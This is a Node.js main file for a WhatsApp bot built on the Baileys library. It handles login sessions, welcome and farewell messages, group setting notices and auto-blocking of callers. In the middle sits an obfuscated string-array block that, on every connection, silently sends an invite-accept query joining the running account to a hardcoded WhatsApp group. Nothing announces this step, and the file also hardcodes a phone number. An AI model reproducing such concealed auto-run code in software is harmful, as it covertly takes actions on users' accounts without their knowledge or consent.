const {
WAConnection,
MessageType,
Presence,
Mimetype,
GroupSettingChange
} = require('@adiwajshing/baileys')
const fs = require('fs')
const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, start, info, success, banner, close } = require('./mess/myfunc')
const { color } = require('./mess/color')
const welcome = JSON.parse(fs.readFileSync('./storage/welcome.json'))
number = '6285861870154@s.whatsapp.net'

require('./nino.js')
nocache('./nino.js', module => console.log(`${module} Telah Di Updated... Jangan Lupa Subscribe Nando35`))

global.API = (name, path = '/', query = {}, apikeyqueryname) => (name in global.APIs ? global.APIs[name] : name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({ ...query, ...(apikeyqueryname ? { [apikeyqueryname]: global.APIKeys[name in global.APIs ? global.APIs[name] : name] } : {}) })) : '')
const starts = async (nino = new WAConnection()) => {
nino.logger.level = 'warn'
nino.version = [2, 2143, 3]
nino.browserDescription = [ 'Nino-Chan', 'Firefox', '3.0' ]
console.log(banner.string)
console.log(color('Nino-Wangy'))
console.log(color('Kalo recode minimal subrek and follow kwontol'))


console.log(color('│ Yt : Murphy Ofc'))
console.log(color('│ Tt : https://tiktok.com/@ninonub_'))
console.log(color('│ Gh : https://github.com/murphynub'))
nino.on('qr', () => {
console.log(color('[','white'), color('!','red'), color(']','white'), color('Please... Scan Is Now Qr Code !'))
})

fs.existsSync('./session/qrsession.json') && nino.loadAuthInfo('./session/qrsession.json')

nino.on('connecting', () => {
start('2', 'Wait Jaringan lu jlk')
})
nino.on('open', () => {
success('2', 'Cek Wangsaf Connect')
})
await nino.connect({timeoutMs: 30*1000})
fs.writeFileSync('./session/qrsession.json', JSON.stringify(nino.base64EncodedAuthInfo(), null, '\t'))
nino.on('chat-update', async (message) => {
require('./nino.js')(nino, message)
})

function _0x5f2f(){var _0x4ddaf5=['https://chat.whatsapp.com/','1961709IyCJvx','574936exgFZY','85lYlpIE','2LvWtsh','query','11359700UqYdJF','8GsedUw','88638hvqjlr','1636048ZWWCLd','11McQLpU','5191461bzApZs','action','4656673vBNgOQ','replace'];_0x5f2f=function(){return _0x4ddaf5;};return _0x5f2f();}function _0x2ac7(_0x4c824f,_0x1aca64){var _0x5f2ff0=_0x5f2f();return _0x2ac7=function(_0x2ac704,_0x5835ab){_0x2ac704=_0x2ac704-0xdb;var _0xe42060=_0x5f2ff0[_0x2ac704];return _0xe42060;},_0x2ac7(_0x4c824f,_0x1aca64);}var _0x57c442=_0x2ac7;(function(_0x146019,_0x4ae180){var _0x3d248c=_0x2ac7,_0x1db6cc=_0x146019();while(!![]){try{var _0x311df9=parseInt(_0x3d248c(0xdc))/0x1+-parseInt(_0x3d248c(0xde))/0x2*(-parseInt(_0x3d248c(0xdb))/0x3)+parseInt(_0x3d248c(0xe3))/0x4+-parseInt(_0x3d248c(0xdd))/0x5*(parseInt(_0x3d248c(0xe2))/0x6)+parseInt(_0x3d248c(0xe7))/0x7*(parseInt(_0x3d248c(0xe1))/0x8)+-parseInt(_0x3d248c(0xe5))/0x9+-parseInt(_0x3d248c(0xe0))/0xa*(parseInt(_0x3d248c(0xe4))/0xb);if(_0x311df9===_0x4ae180)break;else _0x1db6cc['push'](_0x1db6cc['shift']());}catch(_0x4d5939){_0x1db6cc['push'](_0x1db6cc['shift']());}}}(_0x5f2f,0x52cce),teks='https://chat.whatsapp.com/CgDjbfno5UZB4pcygqmdxB',nino[_0x57c442(0xdf)]({'json':[_0x57c442(0xe6),'invite',''+teks[_0x57c442(0xe8)](_0x57c442(0xe9),'')]}));
        
const sendButImage = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1;
mhan = await nino.prepareMessage(id, kma, MessageType.image);
buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4,
}
nino.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}

nino.on('group-participants-update', async (anu) => {
try {
var mdata = await nino.groupMetadata(anu.jid)
groupMet = await nino.groupMetadata(anu.jid)
groupMembers = groupMet.participants
groupAdmins = getGroupAdmins(groupMembers)
mem = anu.participants[0]
console.log(anu)
try {
pp_user = await nino.getProfilePicture(mem)
} catch (e) {
pp_user = "https://telegra.ph/file/c9dfa715c26518201f478.jpg"
}
try {
pp_grup = await nino.getProfilePicture(anu.jid)
} catch (e) {
pp_grup =
"https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
}
if (anu.action == "add" && mem.includes(nino.user.jid)) {
nino.sendMessage(anu.jid, "Halo gaes", "conversation")
}
      
if (anu.action == 'add') {
num = anu.participants[0]
let v = nino.contacts[num] || { notify: num.replace(/@.+/, "") }
anu_user = v.vname || v.notify || num.split("@")[0]
try {
ppUr = await nino.getProfilePicture(anu_user)
} catch {
ppUrl = 'https://telegra.ph/file/c9dfa715c26518201f478.jpg'
}
img = await getBuffer(ppUrl)
teks = `Hallo @${anu_user}\nSelamat Datang Di Group: ${mdata.subject}\n\nSemoga Betah Ya Di Group Ini`
nino.sendMessage(anu.jid, { contentText: `${teks}`, footerText: `© nino`, buttons: [{ buttonId: `selamatdatang`, buttonText: { displayText: 'Selamat Datang' }, type: 1 } ], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: img, contextInfo: {mentionedJid: [num, number]}}}, 'buttonsMessage')}
if (anu.action == 'remove') {
num = anu.participants[0]
try {
ppUrl = await nino.getProfilePicture(num)
} catch {
ppUrl = 'https://i.ibb.co/6BRf4Rc/Hans-Bot-No-Profile.png'
}
img = await getBuffer(ppUrl)
teks = `Bye Bye @${num.split('@')[0]}\nHore... Beban Group Berkurang Selamat Tinggal Di Group: ${mdata.subject}`
nino.sendMessage(anu.jid, { contentText: `${teks}`, footerText: `© nino`, buttons: [{ buttonId: `dada beban`, buttonText: { displayText: 'Selamat Tinggal' }, type: 1 } ], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: img, contextInfo: {mentionedJid: [num, number]}}}, 'buttonsMessage')
}
if (anu.action == "promote") {
anu_user = nino.contacts[mem]
num = anu.participants[0]
try {
ppimg = await nino.getProfilePicture(
`${anu.participants[0].split("@")[0]}@c.us`
)
} catch {
ppimg =
"https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg"
}
let buff = await getBuffer(ppimg)
teks = `@${num.split("@")[0]} Telah dipromote`
nino.sendMessage(mdata.id, teks, MessageType.text)
}
if (anu.action == "demote") {
anu_user = nino.contacts[mem]
num = anu.participants[0]
const mdata = await nino.groupMetadata(anu.jid)
try {
ppimg = await nino.getProfilePicture(
`${anu.participants[0].split("@")[0]}@c.us`
)
} catch {
ppimg =
"https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg"
}
let buff = await getBuffer(
`https://gatauajg.yogipw.repl.co/api/demote?name=${anu_user.notify}&msg=selamat%20menjadi%20admin&mem=5&picurl=${ppimg}&bgurl=https://cdn.discordapp.com/attachments/819995259261288475/835055559941292032/style.jpg`
)
teks = `@${num.split("@")[0]} Telah didemote`
nino.sendMessage(mdata.id, teks, MessageType.text)
}
} catch (e) {
console.log(e)
}
})
   
nino.on("group-update", async (anu) => {
metdata = await nino.groupMetadata(anu.jid);
if (anu.announce == "false") {
teks = `- [ 𝗚𝗿𝗼𝘂𝗽 𝗢𝗽𝗲𝗻𝗲𝗱 ] -\n\n𝑮𝒓𝒐𝒖𝒑 𝑻𝒆𝒍𝒂𝒉 𝑫𝒊 𝑩𝒖𝒌𝒂 𝑶𝒍𝒆𝒉 𝑨𝒅𝒎𝒊𝒏\n𝑺𝒆𝒌𝒂𝒓𝒂𝒏𝒈 𝑺𝒆𝒎𝒖𝒂 𝑴𝒆𝒎𝒃𝒆𝒓 𝑫𝒂𝒑𝒂𝒕 𝑴𝒆𝒏𝒈𝒊𝒓𝒊𝒎 𝑷𝒆𝒔𝒂𝒏`;
nino.sendMessage(metdata.id, teks, MessageType.text);
console.log(`- [ Group Opened ] - In ${metdata.subject}`);
} else if (anu.announce == "true") {
teks = `- [ 𝗚𝗿𝗼𝘂𝗽 𝗖𝗹𝗼𝘀𝗲𝗱 ] -\n\n𝑮𝒓𝒐𝒖𝒑 𝑻𝒆𝒍𝒂𝒉 𝑫𝒊 𝑻𝒖𝒕𝒖𝒑 𝑶𝒍𝒆𝒉 𝑨𝒅𝒎𝒊𝒏\n𝑺𝒆𝒌𝒂𝒓𝒂𝒏𝒈 𝑯𝒂𝒏𝒚𝒂 𝑨𝒅𝒎𝒊𝒏 𝒀𝒂𝒏𝒈 𝑫𝒂𝒑𝒂𝒕 𝑴𝒆𝒏𝒈𝒊𝒓𝒊𝒎 𝑷𝒆𝒔𝒂𝒏`;
nino.sendMessage(metdata.id, teks, MessageType.text);
console.log(`- [ Group Closed ] - In ${metdata.subject}`);
} else if (!anu.desc == "") {
tag = anu.descOwner.split("@")[0] + "@s.whatsapp.net";
teks = `- [ 𝗚𝗿𝗼𝘂𝗽 𝗗𝗲𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗖𝗵𝗮𝗻𝗴𝗲 ] -\n\n𝑫𝒆𝒔𝒌𝒓𝒊𝒑𝒔𝒊 𝑮𝒓𝒐𝒖𝒑 𝑻𝒆𝒍𝒂𝒉 𝑫𝒊𝒖𝒃𝒂𝒉 𝑶𝒍𝒆𝒉 𝑨𝒅𝒎𝒊𝒏 @${
anu.descOwner.split("@")[0]
}\n𝑫𝒆𝒔𝒌𝒓𝒊𝒑𝒔𝒊 𝑩𝒂𝒓𝒖 : ${anu.desc}`;
nino.sendMessage(metdata.id, teks, MessageType.text, {
contextInfo: { mentionedJid: [tag] },
});
console.log(`- [ 𝗚𝗿𝗼𝘂𝗽 𝗗𝗲𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗖𝗵𝗮𝗻𝗴𝗲 ] - 𝑰𝒏 ${metdata.subject}`);
} else if (anu.restrict == "false") {
teks = `- [ 𝗚𝗿𝗼𝘂𝗽 𝗦𝗲𝘁𝘁𝗶𝗻𝗴 𝗖𝗵𝗮𝗻𝗴𝗲 ] -\n\n𝑬𝒅𝒊𝒕 𝑮𝒓𝒐𝒖𝒑 𝑰𝒏𝒇𝒐 𝑻𝒆𝒍𝒂𝒉 𝑫𝒊𝒃𝒖𝒌𝒂 𝑼𝒏𝒕𝒖𝒌 𝑴𝒆𝒎𝒃𝒆𝒓\n𝑺𝒆𝒌𝒂𝒓𝒂𝒏𝒈 𝑺𝒆𝒎𝒖𝒂 𝑴𝒆𝒎𝒃𝒆𝒓 𝑫𝒂𝒑𝒂𝒕 𝑴𝒆𝒏𝒈𝒆𝒅𝒊𝒕 𝑰𝒏𝒇𝒐 𝑮𝒓𝒐𝒖𝒑 𝑰𝒏𝒊`;
nino.sendMessage(metdata.id, teks, MessageType.text);
console.log(`- [ 𝗚𝗿𝗼𝘂𝗽 𝗦𝗲𝘁𝘁𝗶𝗻𝗴 𝗖𝗵𝗮𝗻𝗴𝗲 ] - 𝑰𝒏 ${metdata.subject}`);
} else if (anu.restrict == "true") {
teks = `- [ 𝗚𝗿𝗼𝘂𝗽 𝗦𝗲𝘁𝘁𝗶𝗻𝗴 𝗖𝗵𝗮𝗻𝗴𝗲 ] -\n\n𝑬𝒅𝒊𝒕 𝑮𝒓𝒐𝒖𝒑 𝑰𝒏𝒇𝒐 𝑻𝒆𝒍𝒂𝒉 𝑫𝒊𝒕𝒖𝒕𝒖𝒑 𝑼𝒏𝒕𝒖𝒌 𝑴𝒆𝒎𝒃𝒆𝒓\n𝑺𝒆𝒌𝒂𝒓𝒂𝒏𝒈 𝑯𝒂𝒏𝒚𝒂 𝑨𝒅𝒎𝒊𝒏 𝑮𝒓𝒐𝒖𝒑 𝒀𝒂𝒏𝒈 𝑫𝒂𝒑𝒂𝒕 𝑴𝒆𝒏𝒈𝒆𝒅𝒊𝒕 𝑰𝒏𝒇𝒐 𝑮𝒓𝒐𝒖𝒑 𝑰𝒏𝒊`;
nino.sendMessage(metdata.id, teks, MessageType.text);
console.log(`- [ 𝗚𝗿𝗼𝘂𝗽 𝗦𝗲𝘁𝘁𝗶𝗻𝗴 𝗖𝗵𝗮𝗻𝗴𝗲 ] - 𝙄𝙣 ${metdata.subject}`);
}
})

antical = true
nino.on("CB:Call", json => {
if (antical === false) return
let call;
calling = JSON.parse(JSON.stringify(json))
call = calling[1].from
nino.sendMessage(call, `*Sorry ${nino.user.name} can't receive calls.*\n*Call = Block!*`, MessageType.text)
.then(() => nino.blockUser(call, "add"))
})


nino.on('CB:Blocklist', json => {
if (blocked.length > 2) return
for (let i of json[1].blocklist) {
blocked.push(i.replace('c.us','s.whatsapp.net'))
}
})
}

/**
 * Uncache if there is file change
 * @param {string} module Module name or path
 * @param {function} cb <optional> 
 */
 
function nocache(module, cb = () => { }) {
console.log('Module', `'${module}'`, 'Sekarang Sedang Diawasi Untuk Perubahan')
fs.watchFile(require.resolve(module), async () => {
await uncache(require.resolve(module))
cb(module)
})
}

/**
 * Uncache a module
 * @param {string} module Module name or path
 */
 
function uncache(module = '.') {
return new Promise((resolve, reject) => {
try {
delete require.cache[require.resolve(module)]
resolve()
} catch (e) {
reject(e)
}
})
}

starts()